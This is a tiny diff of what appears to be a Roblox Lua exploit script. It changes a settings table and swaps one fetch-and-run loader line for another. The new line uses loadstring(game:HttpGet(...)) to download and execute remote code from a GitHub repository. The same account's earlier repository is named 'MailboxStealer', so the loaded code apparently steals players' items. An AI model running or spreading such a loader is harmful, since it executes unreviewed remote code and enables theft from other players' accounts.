@@ -41,4 +41,4 @@ getgenv().Settings = {
   }
 }
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Api", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/Mailbox.V2/main/Test2", true))()
